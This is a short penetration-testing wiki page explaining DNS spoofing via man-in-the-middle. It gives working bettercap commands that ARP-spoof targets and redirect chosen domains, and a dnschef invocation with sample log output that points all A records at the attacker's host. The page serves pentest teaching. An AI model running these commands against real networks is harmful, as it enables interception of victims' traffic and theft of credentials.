# DNS Spoofing

DNS spoofing consists of creating a DNS server and responding to DNS queries obtained using the man-in-the-middle technique. Since the DNS protocol is not multicast or broadcast like other protocols (LLMNR, NBT-NS, mDNS), it is necessary to receive DNS requests to our attacking system. To achieve this, we can use techniques such as ARP Spoofing, Rogue DCHP server, DCHPv6 spoofing, etc.

We can use tools like [dnschef](https://github.com/iphelix/dnschef), [responder.py](https://github.com/lgandx/Responder) or [bettercap](https://www.bettercap.org) to perform DNS spoofing.

{% tabs %}
{% tab title="Bettercap" %}
DNS spoofing can be performed with bettercap, using the dns\_spoof module. However, we will first need to perform ARP or DHCPv6 protocol spoofing:

```bash
# ARP spoof:
set arp.spoof.targets <TARGET_IP> # Or network: 10.10.10.0/24
set arp.spoof.whitelist 192.168.232.1 # Optional
arp.spoof on
# DNS spoof:
set dns.spoof.address <LHOST>
set dns.spoof.domains <DOMAIN_1_>,<DOMAIN_2_>
dns.spoof on
```
{% endtab %}

{% tab title="dnschef" %}
[DNSChef](https://github.com/iphelix/dnschef) is a highly configurable DNS proxy for Penetration Testers and Malware Analysts:

{% code title="Fake DNS server with dnschef" %}
```bash
dnschef -i <LHOST> --fakeip <LHOST> --port 53 # For logs: --logfile dnschef.log
          _                _          __  
         | | version 0.4  | |        / _| 
       __| |_ __  ___  ___| |__   ___| |_ 
      / _` | '_ \/ __|/ __| '_ \ / _ \  _|
     | (_| | | | \__ \ (__| | | |  __/ |  
      \__,_|_| |_|___/\___|_| |_|\___|_|  
                   iphelix@thesprawl.org  

(12:29:51) [*] DNSChef started on interface: 192.168.100.44
(12:29:51) [*] Using the following nameservers: 8.8.8.8
(12:29:51) [*] Cooking all A replies to point to 192.168.100.44
(12:38:32) [*] 192.168.100.7: proxying the response of type 'PTR' for 44.100.168.192.in-addr.arpa
(12:38:32) [*] 192.168.100.7: cooking the response of type 'A' for aaa.contoso.local to 192.168.100.44
(12:38:32) [*] 192.168.100.7: proxying the response of type 'AAAA' for aaa.contoso.local
```
{% endcode %}


{% endtab %}
{% endtabs %}
